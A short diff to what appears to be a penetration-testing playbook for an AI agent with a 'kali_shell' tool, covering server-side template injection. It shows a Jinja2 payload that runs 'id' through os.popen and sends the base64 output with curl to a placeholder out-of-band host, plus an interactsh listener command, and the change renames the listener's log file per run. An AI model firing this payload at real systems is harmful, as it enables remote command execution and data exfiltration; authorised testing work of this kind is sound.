@@ -133,9 +133,9 @@ Pick the engine-specific track that matches the Phase 1 fingerprint and run it f
    ```
    {{ cycler.__init__.__globals__.os.popen('curl http://OAST.tld/$(id|base64 -w0)').read() }}
    ```
-   Spin the listener first:
+   Spin the listener first: Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
    ```
-   kali_shell> interactsh-client -v -o /tmp/oast.log
+   kali_shell> interactsh-client -v -o /tmp/oast-RUN.log
    ```
 5. **Automated path** via `kali_shell`:
    ```
